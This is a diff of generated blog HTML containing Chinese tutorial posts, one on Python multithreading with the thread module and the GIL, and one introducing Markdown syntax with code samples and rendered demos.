+<p>​    start_new_thread()函数式thread模块的一个关键函数，它的语法与内建的apply()函数完全一样，其参数为:函数，函数的参数以及可选的关键字参数。不同的是，函数不是在主线程里运行，而是产生一个新的线程来运行这个函数。</p>
+<p>​    这里我们执行的是和onethr.py中一样的循环，不同的是，这一次我们使用的是thread模块提供的多线程的机制。两个循环并发的执行（显然，短的那个先结束）。总的运行时间为最慢的那个线程的运行时间，而不是所有线程的运行时间之和。</p>
+<p>​    </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#mtsleep1.py</span></div><div class="line"><span class="keyword">import</span> thread  <span class="comment">#需要python2环境</span></div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep,ctime</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop0</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'start loop0 at:'</span>,ctime())</div><div class="line">    sleep(<span class="number">4</span>)</div><div class="line">    print(<span class="string">'loop0 done at:'</span>,ctime())</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop1</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'start loop1 at:'</span>, ctime())</div><div class="line">    sleep(<span class="number">2</span>)</div><div class="line">    print(<span class="string">'loop1 done at:'</span>, ctime())</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'starting at:'</span>, ctime())</div><div class="line">    thread.start_new_thread(loop0,())</div><div class="line">    thread.start_new_thread(loop1,())</div><div class="line">    sleep(<span class="number">6</span>)</div><div class="line">    print(<span class="string">'all done at:'</span>,ctime())</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<p>​    这个程序的输出与之前的输出大不相同，之前是运行了6,7秒，而现在则是4秒，是最长的循环的运行时间和其它代码的时间之和。睡眠4秒和睡眠2秒是并发执行的，这样就使得总的运行时间被缩短了。loop1在loop0前面就结束了，而且程序多了一个sleep(6)的函数调用。为什么要加入sleep(6)，这是因为如果没有让主线程停下来，那主线程就会运行下一条语句，显示”all done”，然后就关闭了运行着的loop0()和loop1()的两个线程，退出了。</p>
+<p>​    的确这里应该有更好的管理线程的办法，而不是在主线程里面做一个额外的延时6s的操作。也就是说，我们要写让主线程停下来等所有子线程结束之后再继续运行的代码，这也是线程需要同步的原因。用sleep()函数做线程的同步操作是不可靠的，因为如果有循环的执行时间不能事先确定的话，这可能会造成主线程过早或过晚退出，这就要用到锁了。</p>
+<h3 id="Python多进程"><a href="#Python多进程" class="headerlink" title="Python多进程"></a>Python多进程</h3><h3 id="Python多进程和多线程参考"><a href="#Python多进程和多线程参考" class="headerlink" title="Python多进程和多线程参考"></a>Python多进程和多线程参考</h3><h4 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h4><p><a href="https://www.yiibai.com/concurrency_in_python#" target="_blank" rel="external">Python并发编程理论部分1</a></p>
+<p><a href="https://www.cnblogs.com/linhaifeng/articles/7430066.html#_label1" target="_blank" rel="external">并发编程理论部分2</a></p>
+<p><a href="http://python.jobbole.com/81546/" target="_blank" rel="external">Python模块学习:threading多线程控制和处理</a></p>
+<p><a href="http://www.cnblogs.com/SuperBlee/p/4550359.html" target="_blank" rel="external"><em>Python中的multiprocessing和threading</em> </a></p>
+<p><a href="https://blog.csdn.net/seetheworld518/article/details/49639885" target="_blank" rel="external"><em>Python 多线程 threading和multiprocessing模块</em> </a></p>
+<p><a href="http://python.jobbole.com/87202/" target="_blank" rel="external"><em>Python并发编程之协程/异步IO</em> </a></p>
+<h4 id="1-python多进程"><a href="#1-python多进程" class="headerlink" title="1.python多进程"></a>1.python多进程</h4><p><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431927781401bb47ccf187b24c3b955157bb12c5882d000" target="_blank" rel="external">Python多进程基本说明</a></p>
+<p><a href="https://www.cnblogs.com/lxmhhy/p/6052167.html" target="_blank" rel="external">实现多进程的几种方式</a></p>
+<p><a href="https://www.cnblogs.com/yang520ming/p/8818447.html" target="_blank" rel="external">Python多进程使用说明</a></p>
+<h4 id="2-python多线程"><a href="#2-python多线程" class="headerlink" title="2.python多线程"></a>2.python多线程</h4><p><a href="https://blog.csdn.net/dongfei2033/article/details/77622265" target="_blank" rel="external">Python核心编程-多线程</a></p>
+<p><a href="https://blog.csdn.net/a519640026/article/details/76157999" target="_blank" rel="external">Python的一种线程池模型</a></p>
+<p><a href="https://www.cnblogs.com/zhang293/p/7954353.html" target="_blank" rel="external">多种方式实现Python线程池</a></p>
+<p><a href="https://blog.csdn.net/qq_31479309/article/details/80082502" target="_blank" rel="external">假的多线程</a></p>
+<p><a href="https://www.cnblogs.com/adinosaur/p/7932048.html" target="_blank" rel="external">一个进程内运行多个python虚拟机</a></p>
+<p>​    说明：如果想让python多线程，真正支持多核，那么应该 1、重写python编译器(官方cpython)如使用：PyPy解释器 2、调用C语言的链接库 。</p>
+<p>​    而实际上，多核多线程比单核多线程更差，原因是单核下多线程，每次释放GIL，唤醒的那个线程都能获取到GIL锁，所以能够无缝执行，但多核下，CPU0释放GIL后，其他CPU上的线程都会进行竞争，但GIL可能会马上又被CPU0拿到，导致其他几个CPU上被唤醒后的线程会醒着等待到切换时间后又进入待调度状态，这样会造成线程颠簸(thrashing)，导致效率更低 。</p>
+<h4 id="3-python协程"><a href="#3-python协程" class="headerlink" title="3.python协程"></a>3.python协程</h4><p>​    Python并行的最好策略应当是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。 。</p>
+<p>​       <a href="https://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/0013868328689835ecd883d910145dfa8227b539725e5ed000" target="_blank" rel="external">Python协程概念</a></p>
+<p>​       <a href="http://python.jobbole.com/86481/" target="_blank" rel="external">Python协程的一点剖析</a></p>
+
           
         
       
@@ -1829,7 +1760,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/06/前端学习资料/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/08/markdown入门_1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Bomir">
@@ -1848,7 +1779,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/05/06/前端学习资料/" itemprop="url">前端学习资料</a></h2>
+                <a class="post-title-link" href="/2018/05/08/markdown入门_1/" itemprop="url">markdown入门_1</a></h2>
         
 
         <div class="post-meta">
@@ -1860,8 +1791,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-06T17:17:14+08:00">
-                2018-05-06
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-08T10:49:51+08:00">
+                2018-05-08
               </time>
             
 
@@ -1883,8 +1814,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/前端/" itemprop="url" rel="index">
-                    <span itemprop="name">前端</span>
+                  <a href="/categories/markdown/" itemprop="url" rel="index">
+                    <span itemprop="name">markdown</span>
                   </a>
                 </span>
 
@@ -1900,7 +1831,7 @@
 
           
           
-             <span id="/2018/05/06/前端学习资料/" class="leancloud_visitors" data-flag-title="前端学习资料">
+             <span id="/2018/05/08/markdown入门_1/" class="leancloud_visitors" data-flag-title="markdown入门_1">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -1925,7 +1856,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  189
+                  1,865
                 </span>
               
 
@@ -1941,7 +1872,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1
+                  8
                 </span>
               
             </div>
@@ -1964,43 +1895,318 @@
       
         
           
-            <ol>
-<li>前端知识结构 <a href="https://github.com/JacksonTian/fks" target="_blank" rel="external">https://github.com/JacksonTian/fks</a></li>
-<li>前端入门：<a href="https://github.com/qiu-deqing/FE-learning" target="_blank" rel="external">https://github.com/qiu-deqing/FE-learning</a></li>
-<li>博客：<ul>
-<li><a href="https://www.xuanfengge.com" target="_blank" rel="external">https://www.xuanfengge.com</a></li>
-<li><a href="https://www.w3cplus.com/" target="_blank" rel="external">https://www.w3cplus.com/</a></li>
-<li><a href="https://www.w3ctech.com/" target="_blank" rel="external">https://www.w3ctech.com/</a></li>
-<li><a href="http://www.css88.com/" target="_blank" rel="external">http://www.css88.com/</a></li>
-<li><a href="https://www.qianduan.net/" target="_blank" rel="external">https://www.qianduan.net/</a></li>
-<li><a href="http://www.ruanyifeng.com/blog/" target="_blank" rel="external">http://www.ruanyifeng.com/blog/</a></li>
-<li><a href="http://javascript.ruanyifeng.com/" target="_blank" rel="external">http://javascript.ruanyifeng.com/</a></li>
-<li><a href="http://es6.ruanyifeng.com/" target="_blank" rel="external">http://es6.ruanyifeng.com/</a></li>
+            <h2 id="Markdown基本语法介绍"><a href="#Markdown基本语法介绍" class="headerlink" title="Markdown基本语法介绍"></a>Markdown基本语法介绍</h2><blockquote>
+<p>参考链接:<a href="https://www.jianshu.com/p/b03a8d7b1719" target="_blank" rel="external">https://www.jianshu.com/p/b03a8d7b1719</a> </p>
+<p>简明教程：<a href="https://ouweiya.gitbooks.io/markdown/" target="_blank" rel="external">https://ouweiya.gitbooks.io/markdown/</a> </p>
+<p>有道云MarkDown教程：<a href="http://note.youdao.com/iyoudao/?p=2411" target="_blank" rel="external">http://note.youdao.com/iyoudao/?p=2411</a> </p>
+<p>W3cShcool:<a href="https://www.w3cschool.cn/lme/t13p1sri.html" target="_blank" rel="external">https://www.w3cschool.cn/lme/t13p1sri.html</a></p>
+<h4 id="1-标题"><a href="#1-标题" class="headerlink" title="1.标题"></a>1.标题</h4><p><strong>代码</strong><br>注：#后面保持空格</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># h1</div><div class="line">## h2</div><div class="line">### h3</div><div class="line">#### h4</div><div class="line">##### h5</div><div class="line">###### h6</div><div class="line">####### h7      // 错误代码</div><div class="line">######## h8     // 错误代码</div><div class="line">######### h9    // 错误代码</div><div class="line">########## h10  // 错误代码</div></pre></td></tr></table></figure>
+<h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><h1 id="h1"><a href="#h1" class="headerlink" title="h1"></a>h1</h1><h2 id="h2"><a href="#h2" class="headerlink" title="h2"></a>h2</h2><h3 id="h3"><a href="#h3" class="headerlink" title="h3"></a>h3</h3><h4 id="h4"><a href="#h4" class="headerlink" title="h4"></a>h4</h4><h5 id="h5"><a href="#h5" class="headerlink" title="h5"></a>h5</h5><h6 id="h6"><a href="#h6" class="headerlink" title="h6"></a>h6</h6><p>####### h7</p>
+<p>######## h8</p>
+<p>######### h9</p>
+<p>########## h10</p>
+<h4 id="2-分级标题"><a href="#2-分级标题" class="headerlink" title="2.分级标题"></a>2.分级标题</h4><p><strong>代码</strong></p>
+<blockquote>
+<p>注：=-最少可以只写一个，兼容性一般</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">一级标题</div><div class="line">======================</div><div class="line">二级标题</div><div class="line">---------------------</div></pre></td></tr></table></figure>
+<h4 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h4><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h4 id="3-Toc"><a href="#3-Toc" class="headerlink" title="3.Toc"></a>3.Toc</h4><p><strong>代码</strong></p>
+<blockquote>
+<p>注：根据标题生成目录</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[TOC]</div></pre></td></tr></table></figure>
+<h4 id="演示-2"><a href="#演示-2" class="headerlink" title="演示"></a>演示</h4><p>[TOC]</p>
+<h4 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h4><h4 id="行内标记"><a href="#行内标记" class="headerlink" title="行内标记"></a>行内标记</h4><h4 id="代码块"><a href="#代码块" class="headerlink" title="++代码块++"></a>++代码块++</h4><h4 id="插入链接"><a href="#插入链接" class="headerlink" title="插入链接"></a>插入链接</h4><h4 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h4><h4 id="插入图片带有链接"><a href="#插入图片带有链接" class="headerlink" title="插入图片带有链接"></a>插入图片带有链接</h4><h4 id="序表"><a href="#序表" class="headerlink" title="序表"></a>序表</h4><h4 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h4><h4 id="表情"><a href="#表情" class="headerlink" title="表情"></a>表情</h4><h4 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h4><h4 id="支持内嵌CSS样式"><a href="#支持内嵌CSS样式" class="headerlink" title="支持内嵌CSS样式"></a>支持内嵌CSS样式</h4><h4 id="4-引用"><a href="#4-引用" class="headerlink" title="4.引用"></a>4.引用</h4><p><strong>代码1（单行式）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;hello world!</div></pre></td></tr></table></figure></p>
+<h4 id="演示-3"><a href="#演示-3" class="headerlink" title="演示"></a>演示</h4><blockquote>
+<p>hello world  </p>
+</blockquote>
+<p><strong>代码2（多行式）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; hello world!</div><div class="line">hello world!</div><div class="line">hello world!</div></pre></td></tr></table></figure></p>
+<p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;hello world!</div><div class="line">&gt;hello world!</div><div class="line">&gt;hello world!</div></pre></td></tr></table></figure></p>
+<h4 id="演示-4"><a href="#演示-4" class="headerlink" title="演示"></a>演示</h4><blockquote>
+<p><code>hello world!</code><br><code>hello world!</code><br><code>hello world!</code>  </p>
+</blockquote>
+<p><strong>代码3（多层嵌套）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; aaaaaaaa</div><div class="line">&gt;&gt; bbbbbbbb</div><div class="line">&gt;&gt;&gt; cccccccc</div></pre></td></tr></table></figure></p>
+<h4 id="演示-5"><a href="#演示-5" class="headerlink" title="演示"></a>演示</h4><blockquote>
+<p>aaaaaaaa</p>
+<blockquote>
+<p>bbbbbbbb</p>
+<blockquote>
+<p>ccccccccc</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<h4 id="5-行内标记"><a href="#5-行内标记" class="headerlink" title="5.行内标记"></a>5.行内标记</h4><blockquote>
+<p>注：用 ` 标记代码块将变成一行  </p>
+</blockquote>
+<p><strong>代码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">标记之外`hello world`标记之外</div></pre></td></tr></table></figure></p>
+<h4 id="演示-6"><a href="#演示-6" class="headerlink" title="演示"></a>演示</h4><p>标记之外<code>hello world</code>标记之外  </p>
+<p><strong>错误代码</strong></p>
+<blockquote>
+<p>注：不同平台错误略有差异<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"> 标记之外 ` </div><div class="line">&lt; div&gt;   </div><div class="line">    &lt; div&gt;&lt;/div&gt;</div><div class="line">    &lt; div&gt;&lt;/div&gt;</div><div class="line">    &lt; div&gt;&lt;/div&gt;</div><div class="line">&lt; /div&gt;</div><div class="line">`标记之外</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h4 id="演示-7"><a href="#演示-7" class="headerlink" title="演示"></a>演示</h4><p> 标记之外 <code>&lt; div&gt;   
+    &lt; div&gt;&lt;/div&gt;
+    &lt; div&gt;&lt;/div&gt;
+    &lt; div&gt;&lt;/div&gt;
+&lt; /div&gt;</code> 标记之外</p>
+<h4 id="6-代码块"><a href="#6-代码块" class="headerlink" title="6.代码块"></a>6.代码块</h4><blockquote>
+<p>注：与上行距离一空行  </p>
+</blockquote>
+<p>**代码1(<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&gt; 注：用```生成块  </div><div class="line">#### 演示</div></pre></td></tr></table></figure></p>
+<p><div><br>    <div></div><br>    <div></div><br>    <div></div><br></div><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">**代码2(Tab)**</div><div class="line">&gt; 注：Tab缩进  </div><div class="line">#### 演示</div></pre></td></tr></table></figure></p>
+<p>我是文字……  </p>
+<pre><code>&lt;div&gt;   
+    &lt;div&gt;&lt;/div&gt;
+    &lt;div&gt;&lt;/div&gt;
+    &lt;div&gt;&lt;/div&gt;
+&lt;/div&gt;
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">**代码3(自定义语法)**</div><div class="line">&gt; 注：根据不同的语言配置不同的代码颜色  </div><div class="line"></div><div class="line">```javascript</div><div class="line">var num = 0;</div><div class="line">for (var i = 0; i &lt; 5; i++) &#123;</div><div class="line">    num+=i;</div><div class="line">&#125;</div><div class="line">console.log(num);</div></pre></td></tr></table></figure>
+<h4 id="7-插入链接"><a href="#7-插入链接" class="headerlink" title="7.插入链接"></a>7.插入链接</h4><p><strong>代码1(内链式)</strong>  </p>
+<blockquote>
+<p>注：{:target=”_blank”}跳转方式兼容性一般 ，多数第三方平台不支持跳转  </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[百度1](http://www.baidu.com/&quot; 百度一下&quot;)&#123;:target=&quot;_blank&quot;&#125;</div></pre></td></tr></table></figure>
+<h4 id="演示-8"><a href="#演示-8" class="headerlink" title="演示"></a>演示</h4><p><a href="http://www.baidu.com/" title="百度一下" target="_blank" rel="external">百度1</a></p>
+<p><strong>代码2(引用式)</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[百度2][2]&#123;:target=&quot;_blank&quot;&#125;</div><div class="line">[2]: http://www.baidu.com/   &quot;百度二下&quot;</div></pre></td></tr></table></figure></p>
+<h4 id="演示-9"><a href="#演示-9" class="headerlink" title="演示"></a>演示</h4><p><a href="http://www.baidu.com/" title="百度二下" target="_blank" rel="external">百度2</a> </p>
+<h4 id="8-插入图片"><a href="#8-插入图片" class="headerlink" title="8.插入图片"></a>8.插入图片</h4><p><strong>代码1(内链式)</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">![](./01.png &apos;描述&apos;)</div></pre></td></tr></table></figure></p>
+<h4 id="演示-10"><a href="#演示-10" class="headerlink" title="演示"></a>演示</h4><p><img src="C:/Users/wjq/Desktop/markdown/images/01.png" alt="">  </p>
+<p><strong>代码2(引用式)</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">![name][01]</div><div class="line">[01]: ./01.png &apos;描述&apos;</div></pre></td></tr></table></figure></p>
+<h4 id="演示-11"><a href="#演示-11" class="headerlink" title="演示"></a>演示</h4><p>![name][01]  </p>
+<p>[01]: C:/Users/wjq/Desktop/markdown/images/01.png ‘描述’</p>
+<h4 id="9-插入图片带有链接"><a href="#9-插入图片带有链接" class="headerlink" title="9.插入图片带有链接"></a>9.插入图片带有链接</h4><p><strong>代码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[![](./01.png &apos;百度&apos;)](http://www.baidu.com)&#123;:target=&quot;_blank&quot;&#125;        // 内链式</div><div class="line"></div><div class="line">[![](./01.png &apos;百度&apos;)][5]&#123;:target=&quot;_blank&quot;&#125;                       // 引用式</div><div class="line">[5]: http://www.baidu.com</div></pre></td></tr></table></figure></p>
+<h4 id="演示-12"><a href="#演示-12" class="headerlink" title="演示"></a>演示</h4><h5 id="内链式"><a href="#内链式" class="headerlink" title="内链式"></a>内链式</h5><p><a href="http://www.baidu.com" target="_blank" rel="external"><img src="C:/Users/wjq/Desktop/markdown/images/01.png" alt="" title="百度"></a>  </p>
+<h5 id="引用式"><a href="#引用式" class="headerlink" title="引用式"></a>引用式</h5><p><a href="http://www.baidu.com" target="_blank" rel="external"><img src="C:/Users/wjq/Desktop/markdown/images/01.png" alt="" title="百度"></a>{:target=”_blank”}                </p>
+<h4 id="10-视频插入"><a href="#10-视频插入" class="headerlink" title="10.视频插入"></a>10.视频插入</h4><blockquote>
+<p>注: Markdown语法是不支持直接插入视频的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">普遍的做法是 插入HTML的 iframe 框架，通过网站自带的分享功能获取，如果没有可以尝试第二种方法</div><div class="line">第二是伪造播放界面，实质是插入视频图片，然后通过点击跳转到相关页面</div></pre></td></tr></table></figure></p>
+</blockquote>
+<p><strong>代码1</strong>  </p>
+<blockquote>
+<p>注: 多数第三方平台不支持插入<iframe>视频<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe height=498 width=510 src=&apos;http://player.youku.com/embed/XMjgzNzM0NTYxNg==&apos; frameborder=0 &apos;allowfullscreen&apos;&gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure></iframe></p>
+</blockquote>
+<p><strong>代码2</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[![](./youku2.png)](http://v.youku.com/v_show/id_XMjgzNzM0NTYxNg==.html?spm=a2htv.20009910.contentHolderUnit2.A&amp;from=y1.3-tv-grid-1007-9910.86804.1-2#paction)&#123;:target=&quot;_blank&quot;&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="11-序表"><a href="#11-序表" class="headerlink" title="11.序表"></a>11.序表</h4><p><strong>代码1(有序)</strong>  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1. one</div><div class="line">2. two</div><div class="line">3. three</div></pre></td></tr></table></figure>
+<h4 id="演示-13"><a href="#演示-13" class="headerlink" title="演示"></a>演示</h4><ol>
+<li>one</li>
+<li>two</li>
+<li>three</li>
+</ol>
+<p><strong>代码2(无序)</strong>  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">* one</div><div class="line">* two</div><div class="line">* three</div></pre></td></tr></table></figure>
+<h4 id="演示-14"><a href="#演示-14" class="headerlink" title="演示"></a>演示</h4><ul>
+<li>one</li>
+<li>two</li>
+<li>three</li>
 </ul>
+<p><strong>代码3(序表嵌套)</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1. one</div><div class="line">    1. one-1</div><div class="line">    2. two-2</div><div class="line">2. two</div><div class="line">    * two-1</div><div class="line">    * two-2</div></pre></td></tr></table></figure></p>
+<h4 id="演示-15"><a href="#演示-15" class="headerlink" title="演示"></a>演示</h4><ol>
+<li>one<ol>
+<li>one-1</li>
+<li>two-2</li>
+</ol>
 </li>
-<li>书籍：<a href="https://www.xuanfengge.com/fe-books.html" target="_blank" rel="external">https://www.xuanfengge.com/fe-books.html</a></li>
-<li><p>公司前端团队</p>
-<ul>
-<li>腾讯 AlloyTeam <a href="http://www.alloyteam.com/" target="_blank" rel="external">http://www.alloyteam.com/</a></li>
-<li>百度fex <a href="http://fex.baidu.com/" target="_blank" rel="external">http://fex.baidu.com/</a></li>
-<li>百度efe <a href="http://efe.baidu.com/" target="_blank" rel="external">http://efe.baidu.com/</a></li>
-<li>淘宝FED <a href="http://taobaofed.org/" target="_blank" rel="external">http://taobaofed.org/</a></li>
-<li>去哪儿UED <a href="http://ued.qunar.com/" target="_blank" rel="external">http://ued.qunar.com/</a></li>
-<li>奇舞团 <a href="https://75team.com/" target="_blank" rel="external">https://75team.com/</a></li>
-</ul>
-</li>
-<li><p>开源项目</p>
-<ul>
-<li>Facebook Projects <a href="https://code.facebook.com/projects/web/" target="_blank" rel="external">https://code.facebook.com/projects/web/</a></li>
-<li>百度fex <a href="https://github.com/fex-team/" target="_blank" rel="external">https://github.com/fex-team/</a></li>
-<li>efe <a href="https://github.com/ecomfe" target="_blank" rel="external">https://github.com/ecomfe</a></li>
-<li>alloyteam-github <a href="http://alloyteam.github.io/" target="_blank" rel="external">http://alloyteam.github.io/</a></li>
-<li>underscore源码解读 <a href="https://github.com/hanzichi/underscore-analysis" target="_blank" rel="external">https://github.com/hanzichi/underscore-analysis</a></li>
-<li>vue源码学习 <a href="https://github.com/answershuto/learnVue" target="_blank" rel="external">https://github.com/answershuto/learnVue</a></li>
+<li>two<ul>
+<li>two-1</li>
+<li>two-2</li>
 </ul>
 </li>
 </ol>
-<p>前端学习资源汇总：<a href="https://jeffjade.com/2016/03/30/104-front-end-tutorial/" target="_blank" rel="external">https://jeffjade.com/2016/03/30/104-front-end-tutorial/</a></p>
+<p><strong>代码4(序表嵌套代码块)</strong></p>
+<blockquote>
+<p>注: 换行+两个Tab<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">* one</div><div class="line">    var a = 10; //与上行保持空行并递归缩进</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h4 id="演示-16"><a href="#演示-16" class="headerlink" title="演示"></a>演示</h4><ul>
+<li><p>one </p>
+<pre><code>var a = 10;     //与上行保持空行并递归缩进
+</code></pre></li>
+</ul>
+<h4 id="12-任务列表"><a href="#12-任务列表" class="headerlink" title="12.任务列表"></a>12.任务列表</h4><blockquote>
+<p>注：兼容性一般 要隔开一行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">这是文字……</div><div class="line"></div><div class="line">- [x] 选项一</div><div class="line">- [ ] 选项二  </div><div class="line">- [ ]  [选项3]</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h4 id="演示-17"><a href="#演示-17" class="headerlink" title="演示"></a>演示</h4><ul>
+<li style="list-style: none"><input type="checkbox" checked> 选项一</li>
+<li style="list-style: none"><input type="checkbox"> 选项二  </li>
+<li><p>[ ]  [选项3]</p>
+<h4 id="13-表情"><a href="#13-表情" class="headerlink" title="13.表情"></a>13.表情</h4><blockquote>
+<p>注：兼容一般</p>
+</blockquote>
+<h4 id="14-表格"><a href="#14-表格" class="headerlink" title="14.表格"></a>14.表格</h4><blockquote>
+<p>注：: 代表对齐方式 ,<strong> : 与 | 之间不要有空格</strong>，否则对齐会有些不兼容</p>
+</blockquote>
+</li>
+</ul>
+<p><strong>代码1</strong>  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">| a | b | c | </div><div class="line">|:-------:|:------------- | ----------:| </div><div class="line">| 居中 | 左对齐 | 右对齐 |</div><div class="line">|=========|===============|============|</div></pre></td></tr></table></figure>
+<h4 id="演示-18"><a href="#演示-18" class="headerlink" title="演示"></a>演示</h4><table>
+<thead>
+<tr>
+<th style="text-align:center">a</th>
+<th style="text-align:left">b</th>
+<th style="text-align:right">c</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">居中</td>
+<td style="text-align:left">左对齐</td>
+<td style="text-align:right">右对齐</td>
+</tr>
